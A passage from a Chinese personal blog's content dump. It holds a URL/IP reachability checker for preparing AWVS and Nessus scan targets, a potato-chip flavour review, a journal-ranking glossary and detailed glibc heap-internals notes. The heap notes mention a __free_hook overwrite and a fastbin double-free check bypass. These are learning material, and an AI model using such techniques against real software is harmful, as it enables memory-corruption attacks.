class="string">&quot;https://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    url = i.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">    url = re.sub( <span class="string">r&#x27;/.*&#x27;</span> , <span class="string">&quot;&quot;</span> , url )</span><br><span class="line">    url = re.sub( <span class="string">r&#x27;:.*&#x27;</span> , <span class="string">&quot;&quot;</span> , url )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 找ip</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#ip = socket.gethostbyaddr(url) #name</span></span><br><span class="line">        ip = socket.gethostbyname(url) <span class="comment">#_ex</span></span><br><span class="line">    <span class="keyword">except</span>: <span class="comment">#socket.herror</span></span><br><span class="line">        <span class="comment">#后续</span></span><br><span class="line">        connect_down(i)</span><br><span class="line">        Tip.writerow([i])</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="keyword">return</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 有port</span></span><br><span class="line">    s = socket.socket()</span><br><span class="line">    s.settimeout(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">&quot;:&quot;</span> <span class="keyword">in</span> url):</span><br><span class="line">        port = re.search(i,<span class="string">r&quot;:[0-9]+&quot;</span>)[<span class="number">1</span>:]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s.connect((ip,port))</span><br><span class="line">            ping_ok(ip + <span class="string">&quot;:&quot;</span> + port)</span><br><span class="line">            save(ip,port,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">            <span class="comment">#这里要不保存ip:port和ip？</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            connect_down(url)</span><br><span class="line">            Tip.writerow([i])</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    s.close()    </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 无port，ping3</span></span><br><span class="line">    <span class="comment"># res = ping(ip,s)</span></span><br><span class="line">    <span class="keyword">if</span>( ping(ip,src_addr = <span class="literal">None</span>) != <span class="literal">None</span>):</span><br><span class="line">        save(ip,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        ping_ok(i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        Tip.writerow([i])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;        </span></span><br><span class="line"><span class="string">url/ip/ip+port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">awvs: 可用http://ip:port/.*，不能ip:port/.*，其他都行</span></span><br><span class="line"><span class="string">nessus：ip、domain</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;[a-z]&#x27;</span>,re.I)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        <span class="comment">#url</span></span><br><span class="line">        i = i[:-<span class="number">1</span>]</span><br><span class="line"> </span><br><span class="line">        url = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span>(re.search(<span class="string">&quot;http&quot;</span>,i) == <span class="literal">None</span>):</span><br><span class="line">            url = <span class="string">&quot;http://&quot;</span></span><br><span class="line">        url = url + i</span><br><span class="line">    </span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#r = requests.get(url, timeout=10)</span></span><br><span class="line">            r = client.get( url, headers=header, timeout=<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            url_down(i)</span><br><span class="line">            testip(url)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(r.status_code == <span class="number">200</span>):</span><br><span class="line">            url_as_200(url)</span><br><span class="line">            save(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,url)</span><br><span class="line">                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">检测url能否访问</span></span><br><span class="line"><span class="string">    能-&gt;保存</span></span><br><span class="line"><span class="string">    不能-&gt;检测ip(:port)是否可达()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ip(:port)</span></span><br><span class="line"><span class="string">    给url-&gt;获得ip   ~~（byname 和 byaddr有啥区别？）~~</span></span><br><span class="line"><span class="string">        没有的话保存url</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    给ip:port(/*.html)-&gt;</span></span><br><span class="line"><span class="string">            检测ip(:port)是否可达</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">保存：</span></span><br><span class="line"><span class="string">三类：url/ip/ip+port</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    AWVS：</span></span><br><span class="line"><span class="string">    Nessus：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>乐事各种口味评价</title>
    <url>/4052.html</url>
    <content><![CDATA[<p>记录一下👴吃过的乐事袋装薯片的味道2333</p>
<p>完全不知道为啥会想着要记录这种东西…果然是属于莫名其妙的记录Orz</p>
<span id="more"></span>
<hr>
<p>春日限定-樱花米酿味：外观上表面有些红点（成分表的诱惑红），跟黄瓜味差不多甜，闻起来略微酒酿（醪糟）味，没啥特点，偏硬。属于再也不会吃的那种。（2/10）</p>
<p>蒜蓉烤生蚝味：…开袋需谨慎，一打开凑上去闻了一下差点把👴送走。最开始的几片简直要吐了我☀，吃着吃着倒是好了一些。蒜蓉生蚝的味道确实很够，余味也挺长（吃完之后嘴里留下的味道像是去烧烤店里把生蚝当晚饭了），但是作为薯片略微违和，只是令👴想吃烧烤罢了Orz。口感像是上好佳。（3/10）</p>
<p>孜然烤羊肉串味：贼香，羊肉（主要是膻味）和孜然味道很足，👴吃的爽得一🍺。（9/10）</p>
<p>春日限定-醇香栗子味：外观跟樱花米酿完全一致。开袋挺香的（update：吃完了包装袋放三天还挺香的），一股子混合了咖啡、奶酪、黄油，etc的味道（像是偏甜的提拉米苏？emmm闻着想起了卖咖啡的书店…），反正配料表里是只有个干酪啦2333。吃起来倒是没啥感觉，没有特别突出的味道，要👴盲吃的时候能说出这是栗子味是完全⑧可能的，但说了这玩意是栗子味倒也有点点点点像（不过栗子本身没味道吧Orz），可能唯一跟栗子搭上边的是口感？不知道是不是心理作用口感略绵。感觉分量好少，还没吃出个啥就吃完了。（7/10）</p>
<p>香酥烤鱼味：闻起来跟烧烤味似的，吃起来也差不多，没啥特点，就是味道太重，齁咸。👴感觉👴口味不淡（指可以接受高油高糖高盐的东西），吃了半包差点没吃完。虽然烤鱼味道不是很好表达，但是<em>猛加调料版烧烤味</em>也太扯了，配不上这个口味的名字。👴如果不是想不开就再也不会吃了。（3/10）</p>
<p>老坛酸菜鱼味：闻起来带有较浓的酸菜味，还有点辛，吃起来倒只有很normal的酸菜味，让👴想起了晚上吃的那家酸菜鱼。外观比原味乐事黄一些，口感类似。（7/10）</p>
<p>藤椒钵钵鸡味：没吃过钵钵鸡所以不好评价，藤椒味挺浓的，（何霑说有点辣但是我觉得还行），略香。（8/10）【待续因为吃完后过了两周才记录orz】</p>
<p>生津杨梅味：？（2/10）【存疑，因为感冒了】</p>
<p>金黄炒蟹味：不知道咋评价，对炒蟹没啥概念，反正挺好吃的。（8/10）</p>
<p>香辣小龙虾味：打开一股香辛料（很熟悉但具体是啥却一下子叫不出名字…）和辣椒粉的味道。没咋吃过小龙虾所以不知道正常的香辣小龙虾是啥味道…不过薯片也不辣，香是蛮香的，也的确能吃出虾类外壳的味道（2333）。不过真的很咸，一个人吃70g略难了，3 40g差不多。（5/10）</p>
]]></content>
      <tags>
        <tag>莫名其妙的记录</tag>
      </tags>
  </entry>
  <entry>
    <title>SCI、一区二区、普刊、期刊等等到底是啥</title>
    <url>/62594.html</url>
    <content><![CDATA[<p>正常发挥的话明年年初能发一篇论文，故稍微了解了一下这些名词到底是啥orz不然也太离谱了</p>
<span id="more"></span>
<hr>
<p><strong>三区四区、C类不意味着全都是灌水，一区二区、A类B类也不意味着质量都很高</strong></p>
<ul>
<li>
<p>自然科学领域：<br>
SCI：由美国科学信息研究所ISI创建的科学引文索引（Science Citation Index），<strong>一般说的一区二区三区四区即属于SCI</strong>，一般说的SCI论文指在SCI数据库中收录的期刊上发表的论文</p>
</li>
<li>
<p>社科领域：<br>
SSCI：同为ISI创建的社会科学引文索引（Social Science Citation Index）<br>
CSSCI：中文版的SSCI，由南大建立。</p>
</li>
<li>
<p>工程领域：<br>
EI：工程索引（The Engineering Index），EI论文、EI期刊指收录在EI里的期刊（的论文）<br>
CSCD：中国科学引文数据库</p>
</li>
<li>
<p>期刊：分为核心期刊和普通期刊</p>
</li>
<li>
<p>普刊：顾名思义</p>
</li>
<li>
<p>核刊：国内有七个核心期刊体系。北大“中文核心期刊”（北核）、南大CSSCI（C刊、南核）、中信所“中国科技论文统计源期刊”、社科院“中国人文社会科学核心期刊”、中科院文献情报中心CSCD、人文社会科学学报会“中国人文社科学报核心期刊”、万方“中国核心期刊遴选数据库”。</p>
</li>
<li>
<p>A、B、C、D类：<strong>每个单位自行规定</strong>，意思是某刊在X学会/大学/机构被认定为A类，在Y可能是A类、B类等<br>
例如CCF（中国计算机学会）推荐的ABC类期刊</p>
</li>
<li>
<p>影响因子IF：某刊前两年发表的论文在当年的引用次数/该刊前两年发表论文总数</p>
</li>
</ul>
<p>WILL BE CONTINUED IF NECESSARY …</p>
]]></content>
  </entry>
  <entry>
    <title>堆学习</title>
    <url>/21992.html</url>
    <content><![CDATA[<h1>堆相关数据结构</h1>
<h2 id="微观结构">微观结构</h2>
<h3 id="malloc-chunk">malloc_chunk</h3>
<p>程序malloc出的内存称为chunk，在ptmalloc内部用下面的结构体表示，内存空间释放后被加入空闲管理列表。一个chunk不论是分配还是释放，结构都相同。</p>
<span id="more"></span>
<p>malloc_chunk结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* 前一个chunk（物理相连，较低地址）的大小，包括chunk头（如果前一个chunk空闲），否则可以储存前一个chunk的数据，此时这个域的这个字段无效（chunk的空间复用）  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;     </span><br><span class="line">   <span class="comment">/* 该chunk的大小为2*size的整数倍（size=4或8，32或64位） </span></span><br><span class="line"><span class="comment">      该字段的低3位与大小无关，从高到低 表示</span></span><br><span class="line"><span class="comment">      “是否属于主线程NON_MAIN_ARENA”、</span></span><br><span class="line"><span class="comment">      “是否是由mmap分配IS_MAPPED”、</span></span><br><span class="line"><span class="comment">      “是否被分配PREV_INUSE”</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/*chunk处于分配状态时从fd开始的字段为用户数据</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk;         chunk处于空闲时fd指向前一个空闲的chunk的指针，bk指向后一个空闲的chunk指针(非物理相连)*/</span></span><br><span class="line">                                  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span>         <span class="comment">/*只有chunk空闲时才使用，用于较大的chunk</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk_nextsize;         指向与当前chunk大小不同的第一个空闲块*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184724.png" alt="20210309184724"></p>
<p>一般chunk size表示malloc_chunk的实际大小，而chunk unused size 表示该chunk中除了prev_size、size、fd等辅助成员外的实际大小</p>
<h3 id="bin">bin</h3>
<p>bin是由chunk结构体组成的链表，按照chunk的大小来管理free后的chunk</p>
<p>bin链主要有以下几类，其中只有fast bin是单链表，其他都是双向链表。<br>
对于small bins，large bins，unsorted bins来说，ptmalloc将它们维护在同一个数组中，对应的数据结构在malloc_state中</p>
<h4 id="fast-bin">fast bin</h4>
<p>不属于bins，是ptmalloc单独管理小堆块的数据结构，如果free的chunk大小在0x20~0x80，会优先进入fastbin<br>
采用LIFO，用于较小的内存块。当用户需要的chunk大小小于ptmalloc的最大大小时，ptmalloc先判断fastbin中是否有对应大小的空闲块。<br>
fastbin中的chunk的inuse始终置为1，不会与其他chunk合并。但如果相邻的chunk合并后的大小大于某个值（FASTBIN_CONSOLIDATION_THRESHOLD），就需要把fastbin中的chunk合并（内存碎片）</p>
<p>fastbinsY数组中每个fastbin元素指向该链表的尾节点，尾节点通过fd指针指向前一个节点</p>
<h4 id="small-bin">small bin</h4>
<p>采用FIFO，有62个循环双向链表，每个下标对应的chunk大小都一致，关系为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x(下标)   2*4*x(32位)	2*8*x(64位)</span><br></pre></td></tr></table></figure>
<p>其中每个链表都有链表头结点<br>
fastbin与smallbin中的chunk的大小有很大一部分会重合，fastbin中的chunk很有可能被放到smallbin中</p>
<h4 id="large-bin">large bin</h4>
<p>包括63个bin，每个bin中的chunk大小不一致。将63个bin分成6组，每组bin中的chunk大小的公差（最大-最小）一致</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody>
</table>
<p>其中所有chunk按照从大到小排列</p>
<h4 id="unsorted-bin">unsorted bin</h4>
<p>采用FIFO可以视作空闲chunk回归所属bin前的缓冲区unsorted bin只有一个链表。其中的chunk处于乱序状态，主要有两个来源：</p>
<ul>
<li>较大的chunk被分割后，剩下的部分大于minsize</li>
<li>释放一个不属于fastbin的chunk，并且该chunk不与top chunk相邻</li>
</ul>
<h3 id="top-chunk">top chunk</h3>
<p>程序第一次进行malloc时，heap会被分为两块，其中一块就是top chunk。top chunk即当前堆的物理地址最高的chunk，不属于任何一个bin，只用于在所有bin不满足请求大小时进行分配（如果大小满足），然后将剩下的部分作为top chunk，否则就对heap进行扩展然后再分配（原来的top_chunk紧接着进入unsorted bin，这里可能产生漏洞），在main_arena中通过sbrk扩展，在thread_arena中通过mmap扩展。<br>
topchunk的prev_inuse位始终为1</p>
<h3 id="last-remainder-chunk">last remainder chunk</h3>
<p>当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk</p>
<p>此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</p>
<h2 id="宏观结构">宏观结构</h2>
<p>在glibc malloc中针对堆管理，主要涉及到以下3种数据结构：</p>
<ul>
<li>heap_info: 即Heap Header，因为一个thread arena（注意：不包含main thread）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</li>
<li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等</li>
<li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小.每个chunk都由一个结构体malloc_chunk表示</li>
</ul>
<h3 id="Arena">Arena</h3>
<p>一个线程只有一个arena，各个线程的arena都是独立的。</p>
<p>每个程序中的arena数量是有限制的，与和核心数量有关，因此不是每个线程都会有独立的arena。另外，如果线程数大于核心数的两倍，就必然有线程处于等待状态，所以没有必要都分配独立的arena</p>
<p>主线程的arena称为main_arena；子线程的称为thread_arena。</p>
<p>与 thread arena 不同，main arena 的 arena header（state） 不是保存在通过 sbrk 申请的堆段里，而是作为一个全局变量，可以在 <span class="exturl" data-url="aHR0cDovL2xpYmMuc28=">libc.so<i class="fa fa-external-link-alt"></i></span> 的数据段中找到</p>
<h3 id="heap-info">heap info</h3>
<p>专门为mmap申请的内存（memory mapping segment)准备的，用来记录堆的信息和链接结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Main arena 无需维护多个堆，因此也无需 heap_info。当空间耗尽时，与 thread arena 不同，main arena 可以通过 sbrk 拓展堆段，直至堆段「碰」到内存映射段；</span><br></pre></td></tr></table></figure>
<p>结构的记录的信息包括：</p>
<ul>
<li>堆对应的arena的地址</li>
<li>上一个heap_info的地址</li>
<li>当前堆的大小</li>
<li>用于对齐</li>
</ul>
<h3 id="malloc-state">malloc_state</h3>
<p>用于管理堆，记录每个arena当前申请的所有内存的具体状态。</p>
<p>无论是main arena还是thread arena，都只有一个malloc state结构。对于main arena，这个结构是一个全局变量，放在libc.so的数据段中；对于thread arena，这个结构会放在最新申请的arena中</p>
<h1>malloc的时候做了什么</h1>
<p>（以ptmalloc为例）</p>
<ul>
<li>获得锁或用mmap()开辟出非主分配区</li>
<li>将申请的内存大小转换为实际分配的内存大小</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">malloc寻找堆块的顺序:</span><br><span class="line">1. 在fastbin中寻找有没有对应的chunk</span><br><span class="line">2. 请求大小为small bin范围，在small bin中寻找有没有对应的chunk</span><br><span class="line">3. 考虑是否是large bin，调用malloc_consolidate合并fastbin</span><br><span class="line">   （ fast bin 中的 chunk，将有可能能够合并的 chunk 先进行合并后放到 unsorted bin 中，不能够合并的就直接放到 unsorted bin 中，然后再在下面的大循环中进行相应的处理）</span><br><span class="line"></span><br><span class="line">（↓进入大循环↓）</span><br><span class="line">4. 在unsorted bin中寻找有没有合适的chunk</span><br><span class="line">  如果小于unsorted bin，就对unsorted bin进行切割；如果不满足请求的大小，先把unsorted bin放入small bins或large bins ，然后进行下一步</span><br><span class="line">（--大循环结束--最多迭代10000次）</span><br><span class="line"></span><br><span class="line">5. 在large bin中寻找有没有合适的chunk，根据smalllest-first，best-fit 的原则</span><br><span class="line">  （ps:large bin中的堆块不会进行切割，不满足就到top chunk切割（这个知识点与分配无关）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6. 寻找较大的bin链中有没有合适的chunk</span><br><span class="line">寻找所有map中合适大小的chunk</span><br><span class="line"></span><br><span class="line">7. 使用top_chunk</span><br><span class="line"></span><br><span class="line">8. top_chunk不够用，如果是主分配区就调用sbrk()；非主分配区就调用mmap()，增加top_chunk大小</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>大循环</li>
</ul>
<ol>
<li>按照 FIFO 的方式逐个将 unsorted bin 中的 chunk 取出来<br>
如果是 small request，则考虑是不是恰好满足，是的话，直接返回。<br>
如果不是的话，放到对应的 bin 中。</li>
</ol>
<p>__int_malloc的大循环主要用来处理unsorted bin。如果整个循环没有找到合适的bin，说明所有的unsorted bin的大小都不满足要求</p>
<ul>
<li>malloc_consolidate：用于将fastbin中的chunk合并，清空fastbin。<br>
先尝试向后合并，然后尝试向前合并：<br>
如果向前相邻topchunk则直接合并，如果不相邻则尝试向前合并后插入unsortedbin， 然后获取下一个空闲的chunk，直到fastbin清空</li>
</ul>
<h2 id="堆分配函数">堆分配函数</h2>
<ul>
<li>malloc</li>
<li>calloc<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>
</li>
<li>realloc</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当 realloc(ptr,size) 的 size 不等于 ptr 的 size 时</span><br><span class="line">  如果申请 size &gt; 原来 size</span><br><span class="line">    如果 chunk 与 top chunk 相邻，直接扩展这个 chunk 到新 size 大小</span><br><span class="line">    如果 chunk 与 top chunk 不相邻，相当于 free(ptr),malloc(new_size)</span><br><span class="line">  如果申请 size &lt; 原来 size</span><br><span class="line">    如果相差不足以容得下一个最小 chunk(64 位下 32 个字节，32 位下 16 个字节)，则保持不变</span><br><span class="line">    如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</span><br><span class="line">当 realloc(ptr,size) 的 size 等于 0 时，相当于 free(ptr)</span><br><span class="line">当 realloc(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</span><br></pre></td></tr></table></figure>
<h1>free的时候发生了什么</h1>
<p><span class="exturl" data-url="aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjX19saWJjX2ZyZWU=">源码<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="libc-free">__libc_free</h2>
<p>只有一个参数，为需要free的地址判断：</p>
<ol>
<li>是否hook了（有则执行free_hook，结束free）（下）</li>
<li>free的参数，为NULL直接返回</li>
<li>（指针指向chunk头部）</li>
<li>如果内存是mmap得到的则进行munmap_chunk()，否则执行_int_free（参数为main_arena结构体的地址、header、0）</li>
</ol>
<ul>
<li>free_hook：<br>
判断是否有用户自定义的函数，如果有就执行，然后结束堆释放<br>
<strong>__free_hook漏洞</strong>：如果将__free_hook变为一个system的地址，那么就可以执行这个system的地址</li>
</ul>
<h3 id="int-free">_int_free</h3>
<h4 id="检查">检查</h4>
<ol>
<li>不能指向非法地址</li>
<li>指针对齐2*SIZE_SZ（32位下=4；64位下=8）</li>
<li>free的空间大小小于限制最小的chunk</li>
</ol>
<p>如果检查没有问题就在各个bin分支进行判断</p>
<h3 id="fastbin">fastbin</h3>
<p>如果size小于等于fastbin的最大size且不与top chunk相邻，就进入fastbin分支进行判断，符合条件就插入fastbin头部，成为第一个chunk检查：</p>
<ul>
<li>下一个chunk大小小于2*SIZE_SZ</li>
<li>下一个chunk大小小于system_mem（系统分配的空间总量）<br>
在结构体malloc_state最后：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">INTERNAL_SIZE_T system_mem;</span><br><span class="line">INTERNAL_SIZE_T max_system_mem;</span><br></pre></td></tr></table></figure>
<ul>
<li>设置chunk的mem部分为perturb_byte</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ))</span></span><br><span class="line">free_perturb (<span class="keyword">char</span> *p, <span class="keyword">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br><span class="line">free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br></pre></td></tr></table></figure>
<p>perturb_byte:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> perturb_byte;</span><br><span class="line"></span><br><span class="line">do_set_perturb_byte (<span class="keyword">int32_t</span> value)</span><br><span class="line">&#123;</span><br><span class="line">  LIBC_PROBE (memory_mallopt_perturb, <span class="number">2</span>, value, perturb_byte);</span><br><span class="line">  perturb_byte = value;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>set_fastchunks，对arena的flags标志位的最低bit清零</li>
<li>用chunk的大小判断应该放进哪个fastbin中</li>
<li>对应fastbin的头指针初始化为NULL</li>
<li>automically插入链表:
<ol>
<li>chunk的fd赋值为fastbin的值</li>
<li>fastbin赋值为当前chunk的地址</li>
</ol>
</li>
<li>简单的double free检查，如果top of bin和当前free对象相同则报错，bypass方法为</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">free</span>(a)</span><br><span class="line"><span class="built_in">free</span>(b)</span><br><span class="line"><span class="built_in">free</span>(a)</span><br></pre></td></tr></table></figure>
<ul>
<li>fastbin entry 判断</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect (fastbin_index (chunksize (old)) != idx, <span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<p>另外还有一些多线程的操作没有记上<br>
free一个fastbin的过程只进行了一些判断和链接操作，对inuse位没有处理</p>
<h4 id="代码">代码</h4>
<p>想把代码放上来，但是折叠之后不知道怎么高亮…<br>
从：<br>
<span class="exturl" data-url="aHR0cHM6Ly9jb2RlLndvYm9xLm9yZy91c2Vyc3BhY2UvZ2xpYmMvbWFsbG9jL21hbGxvYy5jLmh0bWwjNDIzMg==">https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#4232<i class="fa fa-external-link-alt"></i></span><br>
到4301行</p>
<h3 id="非fastbin">非fastbin</h3>
<p>包括smallbin、largebin、unsortbin</p>
<h4 id="consolidate-free">consolidate&amp;&amp;free</h4>
<p>合并区块的顺序：先考虑物理低地址的空闲块，合并后的chunk指向合并的chunk的低地址</p>
<p>步骤：</p>
<ol>
<li>获得下一个chunk的地址</li>
<li>3个double free check</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">   top block.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (top)&quot;</span>);</span><br><span class="line"><span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">                    &amp;&amp; (<span class="keyword">char</span> *) nextchunk</span><br><span class="line">                    &gt;= ((<span class="keyword">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;double free or corruption (out)&quot;</span>);</span><br><span class="line"><span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;double free or corruption (!prev)&quot;</span>);</span><br></pre></td></tr></table></figure>
<ol start="3">
<li>调用free_perturb函数</li>
<li>向后合并</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = prev_size (p);</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">  unlink_chunk (av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol start="5">
<li>向前合并</li>
</ol>
<ul>
<li>如果下一个chunk不是top chunk，则合并高地址的chunk，并将合并后的chunk放入unsorted bin</li>
</ul>
